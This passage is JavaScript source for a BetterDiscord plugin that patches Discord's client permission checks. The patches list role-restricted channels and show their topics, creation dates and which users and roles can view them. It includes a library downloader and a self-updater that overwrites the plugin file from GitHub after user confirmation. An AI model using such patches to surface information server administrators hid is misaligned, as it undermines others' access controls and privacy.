/**
 * @name ShowHiddenChannels
 * @displayName Show Hidden Channels (SHC)
 * @version 0.3.0
 * @author JustOptimize (Oggetto)
 * @authorId 619203349954166804
 * @source https://github.com/JustOptimize/return-ShowHiddenChannels
 * @description A plugin which displays all hidden Channels, which can't be accessed due to Role Restrictions, this won't allow you to read them (impossible).
*/

const config = {
  info: {
    name: "ShowHiddenChannels",
    authors: [{
      name: "JustOptimize (Oggetto)",
    }],
    description: "A plugin which displays all hidden Channels, which can't be accessed due to Role Restrictions, this won't allow you to read them (impossible).",
    version: "0.3.0",
    github: "https://github.com/JustOptimize/return-ShowHiddenChannels",
    github_raw: "https://raw.githubusercontent.com/JustOptimize/return-ShowHiddenChannels/main/ShowHiddenChannels.plugin.js"
  },

  changelog: [
    {
      title: "v0.3.0",
      items: [
        "Fixed voice channels icons not showing up",
        "New blacklisted guilds interface in the settings",
        "Now you can click on the id of a user in the \"Users that can see this channel\" list to copy it to your clipboard",
      ]
    },
    {
      title: "v0.2.9",
      items: [
        "Users that can see this channel now display vertically to follow page style"
      ]
    },
    {
      title: "v0.2.8",
      items: [
        "Using common practices for the plugin library and exporting the plugin",
        "Now you can see voice channels permissions",
        "Added channel creation date",
        "Fixed a bug where some users weren't displayed in the channel permissions",
      ]
    }
  ],

  main: "ShowHiddenChannels.plugin.js",
};

class Dummy {
  constructor() {this._config = config;}
  start() {}
  stop() {}
}

if (!global.ZeresPluginLibrary) {
  console.warn("ZeresPluginLibrary is required for this plugin to work. Please install it from https://betterdiscord.app/Download?id=9");
  
  BdApi.showConfirmationModal("Library Missing", `The library plugin needed for ${config.name ?? config.info.name} is missing. Please click Download Now to install it.`, {
      confirmText: "Download Now",
      cancelText: "Cancel",
      onConfirm: () => downloadZLib()
  });

  async function downloadZLib() {
    require("request").get("https://betterdiscord.app/gh-redirect?id=9", async (err, resp, body) => {
      if (err) return errorDownloadZLib();
      if (resp.statusCode === 302) {
          require("request").get(resp.headers.location, async (error, response, content) => {
              if (error) return errorDownloadZLib();
              await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), content, r));
          });
      }
      else {
          await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body, r));
      }
    });
  }

  function errorDownloadZLib() {
    BdApi.showConfirmationModal("Error Downloading", `ZeresPluginLibrary download failed. Manually install plugin library from the link below.`, {
        confirmText: "Download",
        cancelText: "Cancel",
        onConfirm: () => require("electron").shell.openExternal("https://betterdiscord.app/Download?id=9")
    });
  }
}
module.exports = !global.ZeresPluginLibrary ? Dummy : (([Plugin, Library]) => {
  const plugin = (Plugin, Library) => {

    const {
      WebpackModules,
      Patcher,
      Utilities,
      DOMTools,
      Logger,
      ReactTools,
      Modals,
      Settings: { SettingField, SettingPanel, SettingGroup, Switch, RadioGroup },
      DiscordModules: {
        ChannelStore,
        MessageActions,
        TextElement,
        React,
        ReactDOM,
        GuildChannelsStore,
        GuildMemberStore,
        LocaleManager,
        NavigationUtils,
        GuildStore
      }
    } = Library;

    const Tooltip = BdApi.Components.Tooltip;
    const { ContextMenu } = BdApi;
    const NOOP = () => null;
    const DiscordConstants = WebpackModules.getModule((m) => m?.Plq?.ADMINISTRATOR == 8n);
    const { chat } = WebpackModules.getByProps("chat", "chatContent");

    const Route = WebpackModules.getModule((m) =>
      ["impressionName", "impressionProperties", "disableTrack"].every(
        (s) => m?.Z?.toString().includes(s)
      )
    );
    const ChannelItem = WebpackModules.getModule((m) =>
      ["canHaveDot", "unreadRelevant", "UNREAD_HIGHLIGHT"].every((s) =>
        m?.Z?.toString().includes(s)
      )
    );
    const ChannelUtil = WebpackModules.getModule((m) =>
      ["locked", "hasActiveThreads"].every((s) =>
        m?.KS?.toString().includes(s)
      )
    );
    const { rolePill } = WebpackModules.getByProps("rolePill","rolePillBorder");
    const ChannelClasses = WebpackModules.getByProps("wrapper", "mainContent");
    const ChannelPermissionStore = WebpackModules.getByProps("getChannelPermissions");
    const { container } = WebpackModules.getByProps("container", "hubContainer");
    const { Sf: Channel } = WebpackModules.getModule(m => m?.Sf?.prototype?.isManaged);
    const ChannelListStore = WebpackModules.getByProps("getGuildWithoutChangingCommunityRows");
    const IconUtils = WebpackModules.getByProps("getUserAvatarURL");
    const { DEFAULT_AVATARS } = WebpackModules.getByProps("DEFAULT_AVATARS");
    const { iconItem, actionIcon } = WebpackModules.getByProps("iconItem");
    const UnreadStore = WebpackModules.getByProps("isForumPostUnread");
    const Voice = WebpackModules.getByProps("getVoiceStateStats");
    const { U: RolePill } = WebpackModules.getModule(
      (m) => m?.U?.render?.toString().includes("roleStyle")
    );
    const {Z: UserMentions} = WebpackModules.getModule(m => m?.Z?.react?.toString().includes("inlinePreview"));
    const CategoryUtil = WebpackModules.getModule((m) =>
      m?.c4?.toString().includes("CATEGORY_COLLAPSE")
    );

    const CategoryStore = WebpackModules.getByProps(
      "isCollapsed",
      "getCollapsedCategories"
    );

    const ChannelUtils = {
      filter: ["channel", "guild"],
      get Module() {
        return WebpackModules.getModule((m) =>
          this.filter.every((s) => m?.v0?.toString().includes(s))
        );
      },
      get ChannelTopic() {
        return this.Module.v0;
      },
    };
    
    const ChannelTypes = [
      "GUILD_TEXT",
      "GUILD_VOICE",
      "GUILD_ANNOUNCEMENT",
      "GUILD_STORE",
      "GUILD_STAGE_VOICE",
      "GUILD_FORUM",
    ];

    const capitalizeFirst = (string) => `${string.charAt(0).toUpperCase()}${string.substring(1).toLowerCase()}`;
    const randomNo = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);

    const CSS = `
      .shc-hidden-notice {
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          margin: auto;
          text-align: center;
      }	 
      .shc-hidden-notice > div[class^="divider"] {
          display: none
      }	 
      .shc-hidden-notice > div[class^="topic"] {
          background-color: var(--background-secondary);
          padding: 5px;
          max-width: 50vh;
          text-overflow: ellipsis;
          border-radius: 5px;
          margin: 10px auto;
      }

      .shc-rolePill {
        margin-right: 0px !important;
        background-color: var(--background-primary);
      }
    `;

    const defaultSettings = {
      hiddenChannelIcon: "lock",
      sort: "native",
      showPerms: true,
      showAdmin: "channel",
      MarkUnread: false,

      alwaysCollapse: false,
      shouldShowEmptyCategory: false,
      debugMode: false,

      channels: {
        GUILD_TEXT: true,
        GUILD_VOICE: true,
        GUILD_ANNOUNCEMENT: true,
        GUILD_STORE: true,
        GUILD_STAGE_VOICE: true,
        GUILD_FORUM: true,
      },

      blacklistedGuilds: {},
    };

    class IconSwitchWrapper extends React.Component {
      constructor(props) {
        super(props);
        this.state = { enabled: this.props.value };
      }
      render() {
        return React.createElement(
          "div",
          {},
          React.createElement(
            "div",
            { 
              style: {
                display: "flex",
                flexDirection: "row",
                alignItems: "center",
                marginBottom: "15px",
                marginTop: "15px"
              },
            },
            React.createElement(
              "img",
              {
                src: this.props.icon,
                width: 48,
                height: 48,
                title: "Click to toggle",
                style: {
                  borderRadius: "360px",
                  cursor: "pointer",
                  border: this.state.enabled ? "3px solid green" : "3px solid grey",
                  marginRight: "10px"
                },
                onClick: () => {
                  this.props.onChange(!this.state.enabled);
                  this.setState({ enabled: !this.state.enabled });
                }
              }
            ),
            React.createElement(
              "div",
              {
                style: {
                  maxWidth: "89%"
                }
              },
              React.createElement(
                "div",
                {
                  style: {
                    fontSize: "20px",
                    color: "var(--header-primary)",
                    fontWeight: "600",
                  },
                },
                this.props.children,
              ),
              React.createElement(
                "div",
                {
                  style: {
                    color: "var(--header-secondary)",
                    fontSize: "14px"
                  }
                },
                this.props.note
              )
            )
          )
        );
      }
    }
    class IconSwitch extends SettingField {
      constructor(name, note, isChecked, onChange, options = {}) {
        super(name, note, onChange);
        this.disabled = options.disabled;
        this.icon = options.icon;
        this.value = isChecked;
      }
      onAdded() {
        ReactDOM.render(
          React.createElement(IconSwitchWrapper, {
            icon: this.icon,
            children: this.name,
            note: this.note,
            disabled: this.disabled,
            hideBorder: false,
            value: this.value,
            onChange: (e) => {
              this.onChange(e);
            },
          }),
          this.getElement()
        );
      }
    }

    return class ShowHiddenChannels extends Plugin {
      constructor() {
        super();

        this.hiddenChannelCache = {};

        this.collapsed = Utilities.loadData(
          config.info.name,
          "collapsed",
          {}
        );

        this.processContextMenu = this.processContextMenu.bind(this);

        this.settings = Utilities.loadData(
          config.info.name,
          "settings",
          defaultSettings
        );

        this.can = ChannelPermissionStore.can.__originalFunction ?? ChannelPermissionStore.can;
      }

      async checkForUpdates() {
        if (this.settings.debugMode){
          Logger.info("Checking for updates, current version: " + config.info.version);
        }
        
        const SHC_U = await fetch(config.info.github_raw);
        if (!SHC_U.ok) return BdApi.showToast("(ShowHiddenChannels) Failed to check for updates.", { type: "error" });
        const SHCContent = await SHC_U.text();

        if (SHCContent.match(/(?<=version: ").*(?=")/)[0] <= config.info.version) return Logger.info("No updates found.");

        BdApi.showConfirmationModal("Update available", `ShowHiddenChannels has an update available. Would you like to update to version ${SHCContent.match(/(?<=version: ").*(?=")/)[0]}?`, {
          confirmText: "Update",
          cancelText: "Cancel",
          danger: false,

          onConfirm: () => {
            this.proceedWithUpdate(SHCContent);
          },

          onCancel: () => {
            BdApi.showToast("Update cancelled.", { type: "info" });
          }
        });
      }

      async proceedWithUpdate(SHCContent) {
        if (this.settings.debugMode){
          Logger.info("Update confirmed by the user, updating to version " + SHCContent.match(/(?<=version: ").*(?=")/)[0]);
        }

        try {
          const fs = require("fs");
          const path = require("path");

          await fs.writeFile(
            path.join(BdApi.Plugins.folder, "ShowHiddenChannels.plugin.js"),
            SHCContent,
            (err) => {
              if (err) return BdApi.showToast("(ShowHiddenChannels) Failed to update.", { type: "error" });
            }
          );

          BdApi.showToast("ShowHiddenChannels updated to version " + SHCContent.match(/(?<=version: ").*(?=")/)[0], { type: "success" });
        } catch (err) {
          return BdApi.showToast("(ShowHiddenChannels) Failed to update.", { type: "error" });
        }
      }

      onStart() {
        this.checkForUpdates();
        DOMTools.addStyle(config.info.name, CSS);
        this.Patch();
        this.rerenderChannels();
      }

      Patch() {
        Patcher.instead(Channel.prototype, "isHidden", (_, args, res) => {
          return (![1, 3].includes(_.type) && !this.can(DiscordConstants.Plq.VIEW_CHANNEL, _));
        });

        if(!this.settings.MarkUnread) {
          Patcher.after(UnreadStore, "getGuildChannelUnreadState", (_, args, res) => {
            return args[0]?.isHidden() ? { mentionCount: 0, hasNotableUnread: false } : res;
          });

          Patcher.after(UnreadStore, "getMentionCount", (_, args, res) => {
            return ChannelStore.getChannel(args[0])?.isHidden() ? 0 : res;
          });

          Patcher.after(UnreadStore, "getUnreadCount", (_, args, res) => {
            return ChannelStore.getChannel(args[0])?.isHidden() ? 0 : res;
          });

          Patcher.after(UnreadStore, "hasNotableUnread", (_, args, res) => {             
            return res && !ChannelStore.getChannel(args[0])?.isHidden();
          });

          Patcher.after(UnreadStore, "hasRelevantUnread", (_, args, res) => {
            return res && !args[0].isHidden();
          });

          Patcher.after(UnreadStore, "hasTrackedUnread", (_, args, res) => {
            return res && !ChannelStore.getChannel(args[0])?.isHidden();
          });

          Patcher.after(UnreadStore, "hasUnread", (_, args, res) => {
            return res && !ChannelStore.getChannel(args[0])?.isHidden();
          });

          Patcher.after(UnreadStore, "hasUnreadPins", (_, args, res) => {
            return res && !ChannelStore.getChannel(args[0])?.isHidden();
          });
        }

        //* Make hidden channel visible
        Patcher.after(ChannelPermissionStore, "can", (_, args, res) => {
          if (!args[1]?.isHidden?.()) return res;

          if (args[0] == DiscordConstants.Plq.VIEW_CHANNEL)
            return (!this.settings["blacklistedGuilds"][args[1].guild_id] && this.settings["channels"][DiscordConstants.d4z[args[1].type]]);
          if (args[0] == DiscordConstants.Plq.CONNECT)
            return false;

          return res;
        });

        Patcher.after(Route, "Z", (_, args, res) => {
          const channelId = res.props?.computedMatch?.params?.channelId;
          const guildId = res.props?.computedMatch?.params?.guildId;
          const channel = ChannelStore?.getChannel(channelId);

          if (
            guildId &&
            channel?.isHidden?.() &&
            channel?.id != Voice.getChannelId()
          ) {
            res.props.render = () =>
              React.createElement(this.lockscreen(), {
                channel: channel,
                guild: GuildStore.getGuild(guildId),
              });
          }

          return res;
        });
        
        //* Stop fetching messages if the channel is hidden
        Patcher.instead(MessageActions, "fetchMessages", (instance, [args], res) => {
          if (ChannelStore.getChannel(args.channelId)?.isHidden?.())
            return;
          return res.call(instance, args);
        });
        
        if (this.settings["hiddenChannelIcon"]) {
          Patcher.after(ChannelItem, "Z", (_, args, res) => {
            const instance = args[0];

            if (instance.channel?.isHidden()) {
              const item = res.props?.children?.props;
              if (item?.className)
                item.className += ` shc-hidden-channel shc-hidden-channel-type-${instance.channel.type}`;

              const children = Utilities.findInReactTree(res, (m) =>
                m?.props?.onClick?.toString().includes("stopPropagation") && m.type === "div"
              );
              
              if (children.props?.children) {
                children.props.children = [
                  React.createElement(
                    Tooltip,
                    {
                      text: "Hidden Channel",
                    },
                    (props) =>
                      React.createElement(
                        "div",
                        {
                          ...props,
                          className: `${iconItem}`,
                          style: {
                            display: "block",
                          },
                        },
                        this.settings["hiddenChannelIcon"] == "lock" &&
                          React.createElement(
                            "svg",
                            {
                              class: actionIcon,
                              viewBox: "0 0 24 24",
                            },
                              React.createElement("path", {
                                fill: "currentColor",
                                d: "M17 11V7C17 4.243 14.756 2 12 2C9.242 2 7 4.243 7 7V11C5.897 11 5 11.896 5 13V20C5 21.103 5.897 22 7 22H17C18.103 22 19 21.103 19 20V13C19 11.896 18.103 11 17 11ZM12 18C11.172 18 10.5 17.328 10.5 16.5C10.5 15.672 11.172 15 12 15C12.828 15 13.5 15.672 13.5 16.5C13.5 17.328 12.828 18 12 18ZM15 11H9V7C9 5.346 10.346 4 12 4C13.654 4 15 5.346 15 7V11Z",
                              }),
                          ),

                        this.settings["hiddenChannelIcon"] == "eye" &&
                          React.createElement(
                            "svg",
                            {
                              class: actionIcon,
                              viewBox: "0 0 24 24",
                            },
                            React.createElement("path", {
                              fill: "currentColor",
                              d: "M12 5C5.648 5 1 12 1 12C1 12 5.648 19 12 19C18.352 19 23 12 23 12C23 12 18.352 5 12 5ZM12 16C9.791 16 8 14.21 8 12C8 9.79 9.791 8 12 8C14.209 8 16 9.79 16 12C16 14.21 14.209 16 12 16Z",
                            }),
                            React.createElement("path", {
                              fill: "currentColor",
                              d: "M12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12C10 13.1046 10.8954 14 12 14Z",
                            }),
                            React.createElement("polygon", {
                              fill: "currentColor",
                              points:
                                "22.6,2.7 22.6,2.8 19.3,6.1 16,9.3 16,9.4 15,10.4 15,10.4 10.3,15 2.8,22.5 1.4,21.1 21.2,1.3 ",
                            })
                          ),
                        //* Here you can add your own icons
                        // this.settings["hiddenChannelIcon"] == "" &&
                        //   React.createElement(
                        //     "svg",
                        //     {
                        //       class: actionIcon,
                        //       viewBox: "0 0 24 24",
                        //     },
                        //     React.createElement("path", {
                        //       fill: "currentColor",
                        //       d: "",
                        //     })
                        //   ),
                      )
                  )
                ];
              }

              if (
                instance.channel.type == DiscordConstants.d4z.GUILD_VOICE &&
                !instance.connected
              ) {
                // ChannelClasses.wrapper -> wrapper-1S43wv wrapperCommon-I1TMDb
                const wrapper = Utilities.findInReactTree(res, (n) =>
                  n?.props?.className?.includes(ChannelClasses.wrapper)
                );
                if (wrapper) {
                  wrapper.props.onMouseDown = () => {};
                  wrapper.props.onMouseUp = () => {};
                }

               //mainContent-uDGa6R not mainContent-20q_Hp
                const mainContent = Utilities.findInReactTree(res, (n) =>
                  n?.props?.className?.includes(ChannelClasses.mainContent)
                );

                if (mainContent) {
                  mainContent.props.onClick = () => {
                    if (instance.channel?.isGuildVocal()) {
                      NavigationUtils.transitionTo(
                        `/channels/${instance.channel.guild_id}/${instance.channel.id}`
                      );
                    }
                  };

                  mainContent.props.href = null;
                }
              }
            }
            return res;
          });
        }

        //* Remove lock icon from hidden voice channels
        Patcher.before(ChannelUtil, "KS", (_, args) => {
          if (!args[2]) return;
          if (args[0]?.isHidden?.() && args[2].locked){
            args[2].locked = false;
          }
        });

        //* Manually collapse hidden channel category
        Patcher.after(CategoryStore, "getCollapsedCategories", (_, args, res) => {
            return { ...res, ...this.collapsed };
          }
        );

        Patcher.after(CategoryStore, "isCollapsed", (_, args, res) => {
          if (!args[0]?.endsWith("hidden")) {
            return res;
          }

          if (!this.settings["alwaysCollapse"]) {
            return this.collapsed[args[0]];
          }
          
          return (this.settings["alwaysCollapse"] && this.collapsed[args[0]] !== false);
        });

        Patcher.after(CategoryUtil, "c4", (_, args, res) => {
          if (!args[0]?.endsWith("hidden") || this.collapsed[args[0]]) return;

          this.collapsed[args[0]] = true;
          this.rerenderChannels();
          Utilities.saveData(config.info.name, "collapsed", this.collapsed);
        });

        Patcher.after(CategoryUtil, "N5", (_, args, res) => {
          if (this.collapsed[`${args[0]}_hidden`]) return;

          this.collapsed[`${args[0]}_hidden`] = true;
          this.rerenderChannels();
          Utilities.saveData(config.info.name, "collapsed", this.collapsed);
        });

        Patcher.after(CategoryUtil, "mJ", (_, args, res) => {
          if (!args[0]?.endsWith("hidden")) return;
          this.collapsed[args[0]] = false;
          this.rerenderChannels();
          Utilities.saveData(config.info.name, "collapsed", this.collapsed);
        });

        Patcher.after(CategoryUtil, "lc", (_, args, res) => {
          this.collapsed[`${args[0]}_hidden`] = false;
          this.rerenderChannels();
          Utilities.saveData(config.info.name, "collapsed", this.collapsed);
        });

        Patcher.after(GuildChannelsStore, "getChannels", (_, args, res) => {         
          const GuildCategories = res[DiscordConstants.d4z.GUILD_CATEGORY]; 
          const hiddenId = `${args[0]}_hidden`; 
          const hiddenCategory = GuildCategories?.find(m => m.channel.id == hiddenId);
          if (!hiddenCategory) return res;   
          const noHiddenCats = GuildCategories.filter(m => m.channel.id !== hiddenId);    
          const newComprator = (
            noHiddenCats[noHiddenCats.length - 1] || {
              comparator: 0,
            }
          ).comparator + 1;
          Object.defineProperty(hiddenCategory.channel, 'position', {
            value:  newComprator ,
            writable: true
          });
          Object.defineProperty(hiddenCategory, 'comparator', {
            value:  newComprator ,
            writable: true
          });
          return res;         
        })
        Patcher.after(ChannelStore, "getMutableGuildChannelsForGuild", (_, args, res) => {                
          if (this.settings["sort"] !== "extra" || this.settings["blacklistedGuilds"][args[0]]) return;
          const hiddenId = `${args[0]}_hidden`;               
          const HiddenCategoryChannel = new Channel({
            guild_id: args[0],
            id: hiddenId,
            name: "Hidden Channels",
            type: DiscordConstants.d4z.GUILD_CATEGORY,                  
          });       
          const GuildCategories = GuildChannelsStore.getChannels(
            args[0]
          )[DiscordConstants.d4z.GUILD_CATEGORY];  
          Object.defineProperty(HiddenCategoryChannel, 'position', {
            value:  (
              GuildCategories[GuildCategories.length - 1] || {
                comparator: 0,
              }
            ).comparator + 1 ,
            writable: true
          });  
          if (!res[hiddenId])
          res[hiddenId] = HiddenCategoryChannel;
          return res;
        });

        //* Custom category or sorting order
        Patcher.after(ChannelListStore, "getGuild", (_, args, res) => {
          if (this.settings.debugMode)
            Logger.info("ChannelList", res)
            if (this.settings["blacklistedGuilds"][args[0]]) return;
          switch (this.settings["sort"]) {

            case "bottom": {
              this.sortChannels(res.guildChannels.favoritesCategory);
              this.sortChannels(res.guildChannels.recentsCategory);
              this.sortChannels(res.guildChannels.noParentCategory);

              for (const id in res.guildChannels.categories) {
                this.sortChannels(res.guildChannels.categories[id]);
              }

              break;
            }

            case "extra": {
              const hiddenId = `${args[0]}_hidden`;
              const HiddenCategory = res.guildChannels.categories[hiddenId]; 
              const hiddenChannels = this.getHiddenChannelRecord(
                [
                  res.guildChannels.favoritesCategory,
                  res.guildChannels.recentsCategory,
                  res.guildChannels.noParentCategory,
                  ...Object.values(res.guildChannels.categories).filter(
                    (m) => m.id !== hiddenId
                  ),
                ],
                args[0]
              );

              HiddenCategory.channels = Object.fromEntries(Object.entries(hiddenChannels.records).map(([id, channel]) => {
                channel.category = HiddenCategory;
                return [id, channel]
              }))
            
              HiddenCategory.isCollapsed = this.settings["alwaysCollapse"] && this.collapsed[hiddenId] !== false;
              HiddenCategory.shownChannelIds = this.collapsed[hiddenId] || res.guildChannels.collapsedCategoryIds[hiddenId] || HiddenCategory.isCollapsed ? [] : hiddenChannels.channels
                .sort((x, y) => {

                  const xPos = x.position + (x.isGuildVocal() ? 1e4 : 1e5);
                  const yPos = y.position + (y.isGuildVocal() ? 1e4 : 1e5);

                  return xPos < yPos ? -1 : xPos > yPos ? 1 : 0;
                }).map((m) => m.id);
              break;
            }

          }

          if (this.settings["shouldShowEmptyCategory"]) {
            this.patchEmptyCategoryFunction([...Object.values(res.guildChannels.categories).filter(
                (m) => !m.id.includes("hidden")
              ),
            ]);
          }

          return res;
        });

        //* add entry in guild context menu
        ContextMenu.patch("guild-context", this.processContextMenu);
      }

      lockscreen() {
        return React.memo((props) => {
          
          if (this.settings.debugMode) {
            Logger.info(props);
          }

          return React.createElement(
            "div",
            {
              className: ["shc-hidden-chat-content", chat].filter(Boolean).join(" "),
            },
            React.createElement(
              "div",
              {
                className: "shc-hidden-notice",
              },
              React.createElement("img", {
                style: {
                  WebkitUserDrag: "none",
                  maxHeight: 128,
                },
                src: "https://raw.githubusercontent.com/Tharki-God/files-random-host/main/unknown copy.png",
              }),
              React.createElement(
                TextElement,
                {
                  color: TextElement.Colors.HEADER_PRIMARY,
                  size: TextElement.Sizes.SIZE_32,
                  style: {
                    marginTop: 20,
                    fontWeight: "bold"
                  },
                },
                // forum = 15, text = 0, voice = 2, announcement = 5, stage = 13
                "This is a hidden " + (props.channel.type == 15 ? "forum" : props.channel.type == 0 ? "text" : props.channel.type == 2 ? "voice" : props.channel.type == 5 ? "announcement" : props.channel.type == 13 ? "stage" : "") + " channel."
              ),
              React.createElement(
                TextElement,
                {
                  color: TextElement.Colors.HEADER_SECONDARY,
                  size: TextElement.Sizes.SIZE_16,
                  style: {
                    marginTop: 10,
                  },
                },
                "You cannot see the contents of this channel. ",
                props.channel.topic && props.channel.type != 15 && "However, you may see its topic."
              ),
              //* Topic
              props.channel.topic && props.channel.type != 15 && props.guild && ChannelUtils?.ChannelTopic(props.channel, props.guild),

              //* Last message
              props.channel.lastMessageId &&
                React.createElement(
                  TextElement,
                  {
                    color: TextElement.Colors.INTERACTIVE_NORMAL,
                    size: TextElement.Sizes.SIZE_14,
                  },
                  "Last message sent: ",
                  this.getDateFromSnowflake(props.channel.lastMessageId)
                ),


              //* Slowmode
              props.channel.rateLimitPerUser > 0 &&
              React.createElement(
                TextElement,
                {
                  color: TextElement.Colors.INTERACTIVE_NORMAL,
                  size: TextElement.Sizes.SIZE_14,
                  style: {
                    marginTop: 10,
                  },
                },
                "Slowmode: ",
                this.convertToHMS(props.channel.rateLimitPerUser)
              ),

              //* NSFW
              props.channel.nsfw &&
                React.createElement(
                  TextElement,
                  {
                    color: TextElement.Colors.INTERACTIVE_NORMAL,
                    size: TextElement.Sizes.SIZE_14,
                    style: {
                      marginTop: 10,
                    },
                  },
                  "Age-Restricted Channel (NSFW) 🔞"
                ),

              //* Bitrate
              props.channel.bitrate && props.channel.type == 2 &&
                React.createElement(
                  TextElement,
                  {
                    color: TextElement.Colors.INTERACTIVE_NORMAL,

                    size: TextElement.Sizes.SIZE_14,
                    style: {
                      marginTop: 10,
                    },
                  },
                  "Bitrate: ",
                  props.channel.bitrate / 1000,
                  "kbps"
                ),

              //* Creation date
              React.createElement(
                TextElement,
                {
                  color: TextElement.Colors.INTERACTIVE_NORMAL,
                  size: TextElement.Sizes.SIZE_14,
                  style: {
                    marginTop: 10,
                  },
                },
                "Created on: ",
                this.getDateFromSnowflake(props.channel.id)
              ),

              //* Permissions
              this.settings["showPerms"] &&
              props.channel.permissionOverwrites &&
                React.createElement(
                  "div",
                  {
                      style: {
                        marginTop: 20,
                        backgroundColor: "var(--background-secondary)",
                        padding: 10,
                        borderRadius: 5,
                        color: "var(--text-normal)",

                      },
                  }, 

                  //* Users
                  React.createElement(
                    TextElement,
                    {
                      color: TextElement.Colors.INTERACTIVE_NORMAL,
                      size: TextElement.Sizes.SIZE_14,
                    },
                    "Users that can see this channel: ",
                    React.createElement(
                      "div",
                      {
                        style: {
                          marginTop: 5,
                          marginBottom: 5,
                          display: "flex",
                          flexDirection: "column",
                          flexWrap: "wrap",
                          gap: 4,
                          padding: 4,
                          paddingTop: 0,
                        },
                      },
                      ...(() => {
                        const allUsers = Object.values(props.channel.permissionOverwrites).filter(user => (user !== undefined && user?.type == 1) && (user.allow && BigInt(user.allow)) );
                        if (!allUsers?.length) return ["None"];
                        let users = [];

                        allUsers.forEach(user => {
                          const isMember = GuildMemberStore.isMember(props.guild.id, user.id);

                          // if (!isMember) {
                          //   (async () => {
                          //     const req = await APIModule.get({
                          //       url: "/users/" + user.id,
                          //     });
                          //   })();
                          // }

                          const element = isMember
                            ? UserMentions.react(
                                {
                                  userId: user.id,
                                  channelId: props.channel.id
                                },
                                NOOP,
                                {
                                  noStyleAndInteraction: false
                                }
                              )
                            : React.createElement(
                                "span",
                                {
                                  className: "mention wrapper-1ZcZW-",
                                  onClick: () => {
                                    // Copy user id to clipboard
                                    const el = document.createElement("textarea");
                                    el.value = user.id;
                                    document.body.appendChild(el);
                                    el.select();
                                    document.execCommand("copy");
                                    document.body.removeChild(el);
                                    // Show toast
                                    BdApi.showToast("User ID copied to clipboard", { type: "success" });
                                  },
                                },
                                "<@" + user.id + ">"
                              );
                          users.push(element);
                        });
                        
                        return users;
                      })()
                    )
                  ),

                  //* Channel Roles
                  React.createElement(
                    TextElement,
                    {
                      color: TextElement.Colors.INTERACTIVE_NORMAL,
                      style: {
                        borderTop: "1px solid var(--background-tertiary)",
                        padding: 5,
                      },
                    },
                    "Channel-specific roles: ",
                    React.createElement(
                      "div",
                      {
                        style: {
                          paddingTop: 5,
                        },
                      },
                      ...(() => {
                        const channelRoles = Object.values(props.channel.permissionOverwrites).filter(role => 
                          (role !== undefined && role?.type == 0) && 

                          //* 1024n = VIEW_CHANNEL permission
                          //* 8n = ADMINISTRATOR permission
                          ( 
                            //* If role is ADMINISTRATOR it can view channel even if overwrites deny VIEW_CHANNEL
                            (this.settings["showAdmin"] && ((props.guild.roles[role.id].permissions & BigInt(8)) == BigInt(8))) ||

                            //* If overwrites allow VIEW_CHANNEL (it will override the default role permissions)
                            ((role.allow & BigInt(1024)) == BigInt(1024)) ||

                            //* If role can view channel by default and overwrites don't deny VIEW_CHANNEL
                            ((props.guild.roles[role.id].permissions & BigInt(1024)) && ((role.deny & BigInt(1024)) == 0))
                          )
                        );

                        if (!channelRoles?.length) return ["None"];                      
                        return channelRoles.map(m => RolePill.render({
                          canRemove: false,
                          className: `${rolePill} shc-rolePill`,
                          disableBorderColor: true,
                          guildId: props.guild.id,
                          onRemove: NOOP,
                          role: props.guild.roles[m.id]
                        }, NOOP));
                      })(),
                    ),
                  ),
                  this.settings["showAdmin"] && this.settings["showAdmin"] != "channel" && React.createElement(
                    TextElement,
                    {
                      color: TextElement.Colors.INTERACTIVE_NORMAL,
                      style: {
                        borderTop: "1px solid var(--background-tertiary)",
                        padding: 5,
                      },
                    },
                    "Admin roles: ",
                    React.createElement(
                      "div",
                      {
                        style: {
                          paddingTop: 5,
                        },
                      },
                      ...(() => {
                          const guildRoles = [];

                          if (this.settings["showAdmin"]){
                            Object.values(props.guild.roles).forEach(role => {
                              if(
                                  (role.permissions & BigInt(8)) == BigInt(8) &&
                                  (this.settings["showAdmin"] == "include" || (this.settings["showAdmin"] == "exclude" && !role.tags?.bot_id))
                                )
                                {
                                  guildRoles.push(role);
                                }
                            });
                          }

                          if (!guildRoles?.length) return ["None"];                      
                          return guildRoles.map(m => RolePill.render({
                            canRemove: false,
                            className: `${rolePill} shc-rolePill`,
                            disableBorderColor: true,
                            guildId: props.guild.id,
                            onRemove: NOOP,
                            role: m
                          }, NOOP));
                        }
                      )(),
                    )
                  ),
                ),

              //* Forums
              props.channel.type == 15 && (props.channel.availableTags || props.channel.topic) &&
                React.createElement(
                  TextElement,
                  {
                    color: TextElement.Colors.HEADER_SECONDARY,
                    size: TextElement.Sizes.SIZE_16,
                    style: {
                      marginTop: 20,
                      backgroundColor: "var(--background-secondary)",
                      padding: 10,
                      borderRadius: 5,
                      color: "var(--text-normal)",


                      fontWeight: "bold",
                    },
                  },
                  "Forum",

                  //* Tags
                  props.channel.availableTags && props.channel.availableTags.length > 0 &&
                    React.createElement(
                      TextElement,
                      {
                        color: TextElement.Colors.INTERACTIVE_NORMAL,
                        size: TextElement.Sizes.SIZE_14,
                        style: {
                          marginTop: 10,
                        },
                      },
                      "Tags: ",
                      props.channel.availableTags.map((tag) => tag.name).join(", "),
                    ),
                  props.channel.availableTags.length == 0 &&
                    React.createElement(
                      TextElement,
                      { 
                        style: {
                          marginTop: 5,
                        },
                      },
                      "Tags: No tags avaiable"
                    ),
                  //* Guidelines
                  props.channel.topic &&
                    React.createElement(
                      TextElement,
                      {
                        color: TextElement.Colors.INTERACTIVE_NORMAL,
                        size: TextElement.Sizes.SIZE_14,
                        style: {
                          marginTop: 10,
                        },
                      },
                      "Guidelines: ",
                      props.channel.topic
                    ),
                  !props.channel.topic &&
                  React.createElement(
                    TextElement,
                    {
                      color: TextElement.Colors.INTERACTIVE_NORMAL,
                      size: TextElement.Sizes.SIZE_14,
                      style: {
                        marginTop: 10,
                      },
                    },
                    "Guidelines: No guidelines avaiable",
                ),
              )
            )
          )
        });
      }

      convertToHMS(seconds) {
        seconds = Number(seconds);
        var h = Math.floor(seconds / 3600);
        var m = Math.floor((seconds % 3600) / 60);
        var s = Math.floor((seconds % 3600) % 60);

